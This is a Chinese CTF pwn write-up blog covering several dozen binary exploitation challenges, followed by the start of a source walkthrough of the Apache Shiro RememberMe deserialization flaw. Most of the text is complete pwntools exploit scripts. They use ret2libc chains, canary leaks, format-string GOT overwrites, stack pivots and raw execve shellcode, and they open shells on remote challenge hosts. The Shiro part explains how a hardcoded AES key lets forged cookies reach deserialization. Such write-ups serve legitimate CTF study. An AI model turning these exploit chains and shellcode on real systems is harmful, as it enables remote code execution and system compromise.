p64(main)io.sendline(payload1)puts_addr = u64(io.recv(6).ljust(8,b'\\x00'))print(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload2 = b'a' * 24 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendline(payload2)io.interactive() [BJDCTF 2020]babyrop2这题主要考点就是格式化字符串leak出canary，然后利用ROP和LibSearch找到libc，最后getshell 用IDA打开主要看vuln和gift函数，首先看gift char format; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;I'll give u some gift to help u!&quot;); __isoc99_scanf(&quot;%6s&quot;, &amp;format); printf(&amp;format); puts(byte_400A05); fflush(0LL); return __readfsqword(40u) ^ v2; 可以看到最大输入6个字符，我们尝试输入 I'll give u some gift to help u!%6$p 0x7f0070243625Pull up your sword and tell me u story! 发现printf是存在格式化字符串漏洞的，我们在gdb中测试偏移 可以看到，我们输入的泄漏偏移是6，说明格式化字符串的偏移是6，而下面也就是canary的值（以00结尾），在IDA中也可以看到canry在RSP+8的位置，所以泄漏canary的偏移为7，这里其实找后面检查时的canary也🉑️，偏移就是11 这里遇到的几个点 在打exp的时候，会发现有时候recv接收的问题，这个还得多看看语法和具体题目分析，不然打不通 python的一些类型转换的问题会报错，多试试网上的各种写法 开始用main来泄漏发现一直不通，后来改vuln函数就可以。。我觉得是因为栈溢出是发生在vuln中，而main的话是调用，可能打的时候出了些问题 exp from pwn import *from LibcSearcher import *io = remote('1.14.71.254',28083)context.log_level = 'debug'elf = ELF('./bjd_rop2')payload = b&quot;%7$p&quot;io.sendlineafter('u!',payload)#io.recvuntil(&quot;0x&quot;)io.recv()canary = io.recvuntil('\\n')[:-1]#canary = int(io.recv(16),16)pop_rdi_ret = 0x0000000000400993puts_plt = elf.plt['puts']puts_got = elf.got['puts']vuln = elf.symbols['vuln']payload2 = b'a' * (0x20 - 0x8) + p64(int(canary.decode(),16)) + b'a' * 0x8payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)io.recvuntil('Pull up your sword and tell me u story!')io.sendline(payload2)#puts_addr = u64(io.recv(6).ljust(8,b'\\x00'))puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))log.info(hex(puts_addr))libc = LibcSearcher('puts',puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload3 = b'a' * (0x20 - 0x8) + p64(int(canary.decode(),16)) + b'a' * 0x8 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendlineafter(&quot;story!&quot;,payload3)io.interactive() smashes – stack smash主要参考 hollk师傅的分析 原理如下 核心就是利用栈溢出覆盖__libc_argv[0]为我们想要泄漏的信息的地址 exp,主要跟着文章去分析 from pwn import *io = remote('pwn.jarvisoj.com',9877)#io = process('./smashes')padding = 0x7fffffffe418 - 0x7fffffffe200payload = b'a' * padding + p64(0x400d20)io.sendafter('name?', payload)io.interactive() [CISCN 2019华北]PWN164位的只开了nx保护，导入ida中分析，可以看到只要v2变量值为11.28125就能cat /flag，并且在gets输入v1中存在栈溢出，在IDA中看到只要覆盖(0x30 - 0x4)就可以盖到v2 这里我们传输的时候要把11.28125转换成16进制0x41348000 exp from pwn import *io = remote('1.14.71.254', 28093)cat_flag = 0x41348000payload = b'a' * (0x30 - 0x4) + p64(cat_flag)io.sendlineafter(&quot;Let's guess the number.&quot;, payload)io.interactive() [2021 鹤城杯]babyof在IDA中看到buf处存在栈溢出，熟悉的ret2libc 这里要注意最后打payload的时候要加个ret对齐，不然打不通 from pwn import *from LibcSearcher import *io = remote('1.14.71.254', 28081)elf = ELF('./babyof')pop_rdi_ret = 0x0000000000400743ret = 0x0000000000400506put_plt = elf.plt['puts']put_got = elf.got['puts']main = 0x000000000040066Bpayload1 = b'a' * 0x40 + b'a' * 8 + p64(pop_rdi_ret) + p64(put_got) + p64(put_plt) + p64(main)io.recvuntil(&quot;Do you know how to do buffer overflow?&quot;)io.sendline(payload1)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))log.info(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload2 = b'a' * 0x40 + b'a' * 0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendlineafter(&quot;Do you know how to do buffer overflow?&quot;, payload2)io.interactive() [2021 鹤城杯]littleof这一题就是上一题的升级版，开启了canary保护，不过我们观察IDA分析可以发现，第一次printf输出可以leak出canary的值，有了canary就可以ret2libc exp from pwn import *from LibcSearcher import *#io = process('./littleof')io = remote('1.14.71.254', 28031)elf = ELF('./littleof')put_plt = elf.plt['puts']put_got = elf.got['puts']pop_rdi_ret = 0x0000000000400863ret = 0x000000000040059emain = 0x0000000000400789payload = b'a' * (0x50 - 0x8)io.recvuntil(&quot;Do you know how to do buffer overflow?&quot;)io.sendline(payload)io.recvuntil(&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n&quot;)canary = u64(io.recv(7).rjust(8, b'\\x00'))print(&quot;canary:&quot;,hex(canary))payload1 = b'a' * (0x50 - 0x8) + p64(canary) + b'a' * 0x8 + p64(pop_rdi_ret) + p64(put_got) + p64(put_plt) + p64(main)io.sendlineafter(&quot;Try harder!&quot;, payload1)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')payload = b'a' * (0x50 - 0x8)io.recvuntil(&quot;Do you know how to do buffer overflow?&quot;)io.sendline(payload)io.recvuntil(&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n&quot;)canary = u64(io.recv(7).rjust(8, b'\\x00'))payload2 = b'a' * (0x50 - 0x8) + p64(canary) + b'a' * 0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendlineafter(&quot;Try harder!&quot;, payload2)io.interactive() [2021 鹤城杯]easyecho经典的stack smash题目，保护全开。。。导入IDA中观察 这个循环只要输入backdoor就能绕过，但是我们无法找到flag的地址，这就要利用到上面Name处leak出栈上的地址，在v8处，读入16个a 同时我们观察到程序pie基址 所以我们就能得到flag的位置计算flag = pie_base + offset 继续观察IDA，跟进read_flag函数可以发现 可以将flag输出到bss段打印出来，接下来就是找我们的padding 观察栈变量，看到v8和v10差了0x20 因为有gets，我们在v10处栈溢出，通过stack smash输出flag 于是padding = 0x7fffffffe418 - 0x7fffffffe2b0 exp from pwn import *io = remote('1.14.71.254',28013)#io = process('./easyecho')io.sendafter(&quot;Name:&quot;, b'a'*16)io.recvuntil(&quot;Welcome aaaaaaaaaaaaaaaa&quot;)leak_addr = u64(io.recv(6).ljust(8, b'\\x00'))pie_base = leak_addr - 0xcf0open_flag = pie_base + 0x0000000000202040io.recvuntil(&quot;Input: &quot;)io.sendline(&quot;backdoor&quot;)argv0 = 0x7fffffffe418v10 = 0x7fffffffe2b0padding1 = b'a' * (argv0 - v10)payload = padding1 + p64(open_flag)io.sendlineafter(&quot;Input: &quot;, payload)io.recvuntil(&quot;Input: &quot;)io.sendline(&quot;exitexit&quot;)io.interactive() [CISCN 2019东北]PWN2只开了NX保护，导入IDA中分析 只有在encrpt函数里有利用点，开了NX，没有canary，没有可以利用的函数，自然的ret2libc攻击 exp from pwn import *from LibcSearcher import *io = remote('1.14.71.254', 28096)#io = process('./ciscn_2019db_pwn2')elf = ELF('./ciscn_2019db_pwn2')context.log_level = 'debug'puts_plt = elf.plt['puts']puts_got = elf.got['puts']start = elf.symbols['_start']pop_rdi_ret = 0x0000000000400c83ret = 0x00000000004006b9io.sendlineafter(&quot;choice!\\n&quot;, '1')padding = b'a' * 0x50 + b'b' * 0x8payload = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)io.sendlineafter(&quot;encrypted\\n&quot;, payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b'\\x00'))log.info(hex(puts_addr))libc = LibcSearcher('puts', puts_addr)libc_base = puts_addr - libc.dump('puts')system = libc_base + libc.dump('system')bin_sh = libc_base + libc.dump('str_bin_sh')io.sendlineafter(&quot;choice!\\n&quot;, '1')payload1 = padding + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)io.sendlineafter(&quot;encrypted\\n&quot;, payload1)io.interactive() 这题里面那个循环加密好像也不用绕过，我直接打也能通 [深育杯 2021]find_flag保护全开，格式化字符串leak出canary和程序基址 可以算出偏移是6，这样我们再找出canary和pie 有了地址，用vmmap查看基地址算出偏移是0x1140 IDA中可以发现正好有一个漏洞函数，直接利用即可 exp from pwn import *#io = process('./find_flag')io = remote('1.14.71.254',28056)context.log_level = 'debug'fmt = b&quot;aa%17$pbb%16$p&quot;io.recvuntil(&quot;name?&quot;)io.sendline(fmt)io.recvuntil(&quot;aa&quot;)canary = int(io.recv(18), 16)log.info(hex(canary))io.recvuntil(&quot;bb&quot;)addr_base = int(io.recv(14), 16) - 0x1140log.info(hex(addr_base))sub_1228 = 0x1228flag = addr_base + sub_1228payload = b'a' * (0x40 - 0x8) + p64(canary) + b'b' * 0x8 + p64(flag)io.sendlineafter(&quot;else? &quot;, payload)io.interactive() NSS平台上环境有点问题，远程和本地不一样，所以leak pie那里是%16$p,haruki师傅教我直接%p*20数出来🌶️ CGfsbformat string exp from pwn import *io = remote('111.200.241.244', 60496)pwnme = 0x0804A068offset = 10io.sendlineafter('please tell me your name:', b'kkkk')#payload = p32(pwnme) + b&quot;bbbb%10$n&quot;payload = fmtstr_payload(offset, {pwnme:0x8})io.sendlineafter('leave your message please:', payload)io.interactive() greetingexp from pwn import *elf = ELF('./greeting')io = remote('111.200.241.244', 50819)fini_arr = 0x08049934main = 0x080485EDstrlen_got = 0x08049A54system_plt = 0x08048490payload = b'k' * 2 # 2payload += p32(strlen_got+2)payload += p32(fini_arr+2)payload += p32(strlen_got)payload += p32(fini_arr)#16pad_len = len(&quot;Nice to meet you, &quot;) #18payload += b&quot;%&quot; + str(0x0804 - 0x24) + &quot;c%12$hn%13$hn&quot;payload += b&quot;%&quot; + str(0x8490 - 0x0804) + &quot;c%14$hn&quot;payload += b&quot;%&quot; + str(0x85ED - 0x8490) + &quot;c%15$hn&quot;io.sendlineafter(&quot;Please tell me your name... &quot;, payload)io.recvuntil(&quot;Please tell me your name... &quot;)io.sendline('/bin/sh\\x00')io.interactive() 实时数据监测可以直接覆盖，也可以双字节覆盖 exp from pwn import *io = remote('111.200.241.244', 54060)#io = process('./mon')context.log_level = 'debug'key_bss = 0x0804A048offset = 12#payload = fmtstr_payload(offset, {key_bss:0x02223322})payload = p32(key_bss+2) + p32(key_bss)payload += &quot;%&quot; + str(0x0222 - 8) + &quot;c%12$hn&quot;payload += &quot;%&quot; + str(0x3322 - 0x0222) + &quot;c%13$hn&quot;io.sendline(payload)io.interactive() [CISCN 2019西南]PWN1exp from pwn import *io = remote('1.14.71.254', 28030)elf = ELF('./ciscn_2019_sw_pwn1')main = 0x08048534fini_addr = 0x0804979Cprintf_got = elf.got['printf']system_plt = 0x080483d0payload = p32(printf_got + 2) + p32(fini_addr + 2) + p32(printf_got) + p32(fini_addr)payload += &quot;%&quot; + str(0x0804 - 16) + &quot;c%4$hn%5$hn&quot;payload += &quot;%&quot; + str(0x83d0 - 0x0804) + &quot;c%6$hn&quot;payload += &quot;%&quot; + str(0x8534 - 0x83d0) + &quot;c%7$hn&quot;io.sendlineafter('name?', payload)io.recvuntil(&quot;name?&quot;)io.sendline('/bin/sh\\x00')io.interactive() [Black Watch 入群题]PWN经典的栈迁移 exp from pwn import *io = remote('node4.buuoj.cn', 28396)elf = ELF('./spwn')#io = process('./spwn')libc = ELF('./libc-2.23_32.so')#libc = ELF('/lib/i386-linux-gnu/libc.so.6')context.log_level = 'debug'write_plt = elf.plt['write']write_got = elf.got['write']main = elf.sym['main']s = 0x0804A300leave_ret = 0x08048408io.recvuntil('name?')payload0 = p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)io.sendline(payload0)io.recvuntil('say?')payload1 = b'a' * 0x18 + p32(s - 4) + p32(leave_ret)#不能用sendline，多一个\\n在缓冲区内io.send(payload1)write_addr = u32(io.recv(4))log.info(hex(write_addr))libc_base = write_addr - libc.symbols['write']system = libc_base + libc.symbols['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))io.recvuntil('name?')payload2 = p32(system) + p32(0) + p32(bin_sh)io.sendline(payload2)io.recvuntil('say?')io.sendline(payload1)io.interactive() [CISCN 2019东南]PWN2exp 那两个ebp的偏移计算 https://blog.csdn.net/Y_peak/article/details/113823280 测试exp from pwn import *io = process('./ciscn_2019_es_pwn2')#io = remote('1.14.71.254', 28096)system = 0x08048400leave_ret = 0x080484b8payload = b'a' * 0x27 + b'k'io.recvuntil('name?\\n')io.send(payload)io.recvuntil('k')ebp_addr = u32(io.recv(4))log.info(hex(ebp_addr))payload1 = (b'bkdr' + p32(system) + p32(0xdeadbeef) + b'shdr' + b'/bin/sh\\x00').ljust(0x28, b'\\x00')raw_input('debug:')io.sendline(payload1) io.interactive() from pwn import *#io = process('./ciscn_2019_es_pwn2')io = remote('1.14.71.254', 28096)system = 0x08048400leave_ret = 0x080484b8payload = b'a' * 0x27 + b'k'io.recvuntil('name?\\n')#这里不能用sendline，多一个\\n，多一个字节接收到的地址是错的io.send(payload)io.recvuntil('k')ebp_addr = u32(io.recv(4))log.info(hex(ebp_addr))payload1 = (b'k' * 4 + p32(system) + p32(0xdeadbeef) + p32(ebp_addr - 0x28) + b&quot;/bin/sh\\x00&quot;).ljust(0x28, b'\\x00')payload1 += p32(ebp_addr-0x38) + p32(leave_ret)io.sendline(payload1)io.interactive() format2这题函数蛮多，但是也就主要分析那几个 首先看主函数，输入的被解密后放在v6，v6的长度不能超过0xc ,也就是我们payload最大长度是12 漏洞点在auth函数这里，看到memcpy，在v4处就有4个字节的溢出，可以覆盖到auth函数ebp处的内容，而ebp处存的就是之前main函数的ebp，而这里我们就可以修改为我们想要利用的地址，进而main退出时执行leave，mov esp,ebp,esp的值就指向我们利用的地址，劫持了程序执行流程 可以参考这位师傅的文章图解 https://blog.csdn.net/weixin_43868725/article/details/108366539?ops_request_misc=%7B%22request_id%22%3A%22164229926316780265467309%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=164229926316780265467309&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108366539.first_rank_v2_pc_rank_v29&amp;utm_term=format2&amp;spm=1018.2226.3001.4187 exp from pwn import *import base64#io = process('./format2')io = remote('111.200.241.244', 57858)bin_sh = 0x08049284input = 0x0811EB40payload = base64.b64encode(b'a' * 4 + p32(bin_sh) + p32(input))io.recvuntil('Authenticate : ')io.sendline(payload)io.interactive() [mssctf2021]signin西电举办的中学生CTF竞赛 放一下复现地址https://ctf.xidian.edu.cn/challenges 这题主要考栈溢出+整数溢出，可以看到v6是一个unsigned int8范围是0-255,就可以根据这个绕过if判断，然后通过main的read读入及strcpy覆盖signin的v5返回到后门函数的地址 exp from pwn import *#io = process('./signin')io = remote('pwn.archive.xdsec.chall.frankli.site' ,10006)system_addr = 0x080492B6payload = b'ZXFxaWUmY29yMWU=' + b'a' * (0x89 + 4 - 16) + p32(system_addr) + b'b' * 140io.sendline(payload)io.interactive() [mssctf2021]shellcode因为有个call rdi所以IDA无法进行反汇编，需要嗯看汇编 就是往buf里读入0x3c个字节，再将buf载到rax里，再给buf的指针加0xa个字节，放到rdi里，再call rdi，因为没有开NX保护，所以我们先填入0xa个长度的padding，再往buf里写入shellcode就可以 exp from pwn import *#要指定好架构是64位的context.arch = 'amd64'p = remote('pwn.archive.xdsec.chall.frankli.site' ,10022)shellcode = b&quot;\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05&quot;payload = b'a'*10 + shellcodep.sendline(payload)p.interactive() int_overflow攻防世界的一道整数溢出的练习题 漏洞点就在这个check_passwd函数里的一个变量存储方面 这里的v3是unsigned int8类型，就相当于一个无符号char 型范围在0-255，而ta接受的是一个size_t类型(unsigned int)的数据，从而造成无符号数的回绕 exp from pwn import *io = remote('111.200.241.244',49854)flag = 0x0804868Bio.sendlineafter('choice:', str(1))io.sendlineafter('username:', b'kkkk')payload = b'a' * 0x14 + b'b' * 0x4 + p32(flag) + 232 * b'a'io.sendlineafter('passwd:', payload)io.interactive() wustctf2020_number_game也是一道整数溢出的题目 程序很简单，就一个取负数判断，绕过判断就直接getshell v1是一个32位的int类型变量，范围在-2147483648~-2147483647，所以我们输入一个小与-2147483648的数就可以了 exp from pwn import *io = remote('node4.buuoj.cn',26318)payload = str(-2147483649)io.sendline(payload)io.interactive() string程序很长，看故事，但是并不复杂，需要点耐心去分析，考点还是格式化字符串漏洞 这个函数里明显看到漏洞点 再看到这个函数可以发现getshell的点 只要将传入的指针变量a1的值，修改为和*(a+1)相同的值，再执行shellcode 顺便注意下，算偏移要注意是32位还是64位，两种传参不一样，最好用gdb算 exp from pwn import *#io = process('./string')context.arch = 'amd64'io = remote('111.200.241.244', 52695)io.recvuntil('secret[0] is ')key = int(io.recvuntil('\\n'), 16)log.info(hex(key))io.sendlineafter('What should your character\\'s name be:', b'lnk')io.sendlineafter('So, where you will go?east or up?:', b'east')io.sendlineafter('go into there(1), or leave(0)?:', str(1))io.sendlineafter(&quot;'Give me an address'&quot;, str(key))#64位传参调用变了,开始数出来是%8$payload = b&quot;%85c%7$n&quot;io.sendlineafter('And, you wish is:', payload)shellcode = b&quot;\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05&quot;io.sendlineafter('Wizard: I will help you! USE YOU SPELL\\n', shellcode)io.interactive() [mssctf2021 Finals]SignIn签到题吧，跟着提示去注册登录拿flag，考pwntools的交互使用 exp from pwn import *io = remote('pwn.archive.xdsec.chall.frankli.site', 10093)#io = process('./signin')io.sendlineafter('Your choice:', b'1')io.sendlineafter('Please input your UserName:', b'lnk')io.recvuntil('Here\\'s your key: \\n')key = io.recvline()log.info(f&quot;key is: {key}&quot;)io.sendlineafter('Your choice:', b'2')io.sendlineafter('User name:', b'lnk')io.sendlineafter('Password:', key)io.sendlineafter('Your choice:', b'3')io.recvuntil('Here\\'s your key: ')flag = io.recvline()io.sendlineafter('Tell me your key:', flag)io.interactive() [mssctf2021 Finals]shellcode和初赛差不多一样的题，注意shellcode的长度，不能超过30 exp from pwn import *context.arch = 'amd64'#p = remote('pwn.archive.xdsec.chall.frankli.site' ,10022)p = process('./shellcode')shellcode = b&quot;\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05&quot;print(len(shellcode))payload = shellcodep.recvuntil('Tell me what to do:\\n')p.sendline(payload)p.interactive() gyctf_2020_borrowstack一道栈迁移的题，且bss段和got的地址相距较近，需要利用ret抬高栈帧，不然执行ROP的时候会修改got表中的值，导致泄漏的地址不对。 exp from pwn import *io = remote('node4.buuoj.cn',29764)#context.log_level = 'debug'elf = ELF('./borrowstack')libc = ELF('./libc-2.23.so')puts_got = elf.got['puts']puts_plt = elf.plt['puts']main = elf.symbols['main']bank_addr = 0x0000000000601080pop_rdi_ret = 0x0000000000400703leave_ret = 0x0000000000400699ret = 0x00000000004004c9payload = b'a' * 0x60 + p64(bank_addr) + p64(leave_ret)io.sendafter('Ｗelcome to Stack bank,Tell me what you want', payload)io.recvuntil('Done!You can check and use your borrow stack now!')payload = p64(ret) * 20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)io.send(payload)io.recvline()puts_addr = u64(io.recv(6).ljust(8,b'\\x00'))log.info(hex(puts_addr))libc_base = puts_addr - libc.symbols['puts']shell = libc_base + 0x4526apayload = b'a' * 0x60 + p64(0xdeadbeef) + p64(shell)io.send(payload)io.recvuntil('Ｗelcome to Stack bank,Tell me what you want\\nDone!You can check and use your borrow stack now!')io.send(str(1))io.interactive() [SWPU 2019]login格式化字符串在bss段的利用，对这个点不熟悉的话可以先去做做HITCON—Traning LAB 9 那道例题，这两题差不多 exp from pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']elf = ELF('./SWPUCTF_2019_login')io = process('./SWPUCTF_2019_login')#io = remote('1.14.71.254', 28044)#io = remote('node4.buuoj.cn', 27316)libc = elf.libc#libc = ELF('./libc-2.27_32.so')sl = lambda s : io.sendline(s)sa = lambda s, payload : io.sendlineafter(s,payload)sd = lambda s : io.send(s)rv = lambda n : io.recv(n)rc = lambda : io.recv()ru = lambda s : io.recvuntil(s)def ms(name,addr): print(name + &quot;----&gt;&quot; + hex(addr))def debug(mallocr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print }}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(io,'b *{}'.format(hex(text_base+mallocr))) else: gdb.attach(io,&quot;b *{}&quot;.format(hex(mallocr)))printf_got = elf.got['printf']ms(&quot;printf_got&quot;, printf_got)name = &quot;lnk&quot;sa(&quot;Please input your name:&quot;,name)ru(&quot;Please input your password:&quot;)payload = 'aaaa%6$p'sl(payload)ru(&quot;aaaa&quot;)ru(&quot;0x&quot;)ebp_content = int(rv(8), 16)#change = (int(io.recvline()[2:10],16)-4)&amp;0xff#ms(&quot;change&quot;,change)change = (ebp_content - 0x4) &amp; 0xffms(&quot;stack&quot;, ebp_content)ms(&quot;change&quot;, change)payload1 = &quot;%&quot; + str(change) + &quot;c%6$hhn&quot;ru(&quot;Try again!&quot;)sl(payload1)payload2 = &quot;%&quot; + str(0x14) + &quot;c%10$hhn&quot;ru(&quot;Try again!&quot;)sl(payload2)#raw_input('&gt;')# modify againpayload3 = &quot;%&quot; + str(change - 0x4) + &quot;c%6$hhn&quot;ru(&quot;Try again!&quot;)sl(payload3)payload4 = &quot;%&quot; + str(0xb016) + &quot;c%10$hn&quot;ru(&quot;Try again!&quot;)sl(payload4)#raw_input('&gt;')#debug(0x80485af,0)# leak printf address to get system addressru(&quot;Try again!&quot;)leak_printf = &quot;bbbb%9$s&quot;sl(leak_printf)ru('bbbb')printf_addr = u32(rv(4))ms(&quot;printf_addr&quot;, printf_addr)libc_base = printf_addr - libc.symbols['printf']ms(&quot;libc_base&quot;, libc_base)system_addr = libc_base + libc.symbols['system']ms(&quot;pt_libc&quot;, libc.symbols['printf'])ms('sys_libc', libc.symbols['system'])ms(&quot;system_addr&quot;, system_addr)syslow = system_addr &amp; 0xffffsyshigh = system_addr &gt;&gt; 16payload5 = &quot;%&quot; + str(syslow) + &quot;c%9$hn&quot;payload5 += &quot;%&quot; + str(syshigh - syslow) + &quot;c%8$hn&quot;ru(&quot;Try again!&quot;)sl(payload5)ru(&quot;Try again!&quot;)sl(&quot;/bin/sh&quot;)io.interactive() bbctf_2020_fmt_mesnprintf造成的格式化字符串漏洞，一开始没找到利用点，后来经过提醒才想到改写got表，（我是🥬🐔呜呜呜 首先程序执行一次就退出了，不能循环利用，我们先改system@got为main函数的地址，达到无限循环的目的 payload1 = fmtstr_payload(6, {system_got:main_addr}, write_size='long') 偏移是6是因为snprintf从右到左传参，要减去另外两个参数，当然也可以像下图这样数出来 接下来改写atoi函数的got为system函数的装载地址也就是system@plt+6，最后传入/bin/sh就可以getshell exp from pwn import *#io = process('./bbctf_2020_fmt_me')io = remote('node4.buuoj.cn',27747)elf = ELF('./bbctf_2020_fmt_me')context.log_level = 'debug'context.arch = 'amd64'system_got = elf.got['system']print('sys_got--&gt;', hex(system_got))main_addr = elf.sym['main']print('main--&gt;', hex(main_addr))atoi_got = elf.got['atoi']io.recvuntil('Choice: ')io.sendline(str(2))payload1 = fmtstr_payload(6, {system_got:main_addr}, write_size='long')#raw_input('&gt;')io.sendlineafter('Good job. I\\'ll give you a gift.', payload1)payload2 = fmtstr_payload(6, {atoi_got:0x00401056}, write_size='long')io.recvuntil('Choice: ')io.sendline(str(2))io.sendlineafter('Good job. I\\'ll give you a gift.', payload2)io.recv()io.sendline(b'/bin/sh')io.interactive()","link":"/2021/12/11/prc_pwn/"},{"title":"shiro反序列化分析(一)","text":"前言最近这段时间心情太糟糕了，有点压抑，还是得调整一下吧，不能这么e下去 环境搭建这里采用p牛搭好的环境 访问http://localhost:8081/shirodemo/login.jsp 漏洞分析漏洞原理Apache Shiro框架提供了RememberMe的功能，用户登陆成功后会生成经过AES加密并base64的cookie，传到服务器端后会经过Base64解码–&gt;AES解密–&gt;反序列化，AES是一种对称加密的算法，只要我们获得了KEY，就能够构造恶意的对象加密并编码，传到cookie上让其进行反序列化执行恶意代码 加密过程首先入口点在onSuccessfulLogin这个方法 断在这两处，首先会判断是否选择了rememberme字段，选择了，就往下走，其中token保存了用户登录信息。继续跟进到rememberIdentity方法，再直接进到this.rememberIdentity(subject, principals) 这里有个convertPrincipalsToBytes看意思应该就是将认证信息转为字节 protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) { byte[] bytes = serialize(principals); if (getCipherService() != null) { bytes = encrypt(bytes); } return bytes; } 将principals序列化，然后调getCipherService()，这个方法就是会返回一个加密模式 回到之前，通过if后，直接encrypt去加密bytes protected byte[] encrypt(byte[] serialized) { byte[] value = serialized; CipherService cipherService = getCipherService(); if (cipherService != null) { ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey()); value = byteSource.getBytes(); } return value; } 这里同样也是先获得加密方法，然后将传入的bytes和getEncryptionCipherKey()一起扔进加密函数 其中那个key是硬编码写好的，我们可以往回找发现它是一个常量值 这里我们就获得了这个关键的密钥 然后就是经过加密算法，返回加密后的结果，具体密码学部分我们就不分析了（👴看不懂 然后回到下一步的rememberSerializedIdentity protected void rememberSerializedIdentity(Subject subject, byte[] serialized) { if (!WebUtils.isHttp(subject)) { if (log.isDebugEnabled()) { String msg = &quot;Subject argument is not an HTTP-aware instance. This is required to obtain a servlet &quot; + &quot;request and response in order to set the rememberMe cookie. Returning immediately and &quot; + &quot;ignoring rememberMe operation.&quot;; log.debug(msg); } return; } HttpServletRequest request = WebUtils.getHttpRequest(subject); HttpServletResponse response = WebUtils.getHttpResponse(subject); //base 64 encode it and store as a cookie: String base64 = Base64.encodeToString(serialized); Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies Cookie cookie = new SimpleCookie(template); cookie.setValue(base64); cookie.saveTo(request, response); } 具体看下面一部分，通过对我们传入的数据进行base64编码，然后就设置到Cookie中去，而name就是rememberme 这就是具体的加密流程 解密过程通过搜索CookieRememberMe关键字找到这个类CookieRememberMeManager，然后锁定到这个方法getRememberedSerializedIdentity protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { if (!WebUtils.isHttp(subjectContext)) { if (log.isDebugEnabled()) { String msg = &quot;SubjectContext argument is not an HTTP-aware instance. This is required to obtain a &quot; + &quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot; + &quot;immediately and ignoring rememberMe operation.&quot;; log.debug(msg); } return null; } WebSubjectContext wsc = (WebSubjectContext) subjectContext; if (isIdentityRemoved(wsc)) { return null; } HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = getCookie().readValue(request, response); // Browsers do not always remove cookies immediately (SHIRO-183) // ignore cookies that are scheduled for removal if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null; if (base64 != null) { base64 = ensurePadding(base64); if (log.isTraceEnabled()) { log.trace(&quot;Acquired Base64 encoded identity [&quot; + base64 + &quot;]&quot;); } byte[] decoded = Base64.decode(base64); if (log.isTraceEnabled()) { log.trace(&quot;Base64 decoded byte array length: &quot; + (decoded != null ? decoded.length : 0) + &quot; bytes.&quot;); } return decoded; } else { //no cookie set - new site visitor? return null; } } 这个看名字就知道是获得我们加密最后一步的数据，然后进行base64解码，我们往回找，可以看到是这个方法调用了它 public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) { PrincipalCollection principals = null; try { byte[] bytes = getRememberedSerializedIdentity(subjectContext); //SHIRO-138 - only call convertBytesToPrincipals if bytes exist: if (bytes != null &amp;&amp; bytes.length &gt; 0) { principals = convertBytesToPrincipals(bytes, subjectContext); } } catch (RuntimeException re) { principals = onRememberedPrincipalFailure(re, subjectContext); } return principals;} 它得到数据之后，又调用了convertBytesToPrincipals protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) { if (getCipherService() != null) { bytes = decrypt(bytes); } return deserialize(bytes);} 中间不多说，就是解密过程，我们之间跟进到deserialize 一直跟进，找到调用它的方法 public Object deserialize(byte[] serialized) { if (serialized == null) { throw new IllegalArgumentException(&quot;Argument cannot be null.&quot;); } 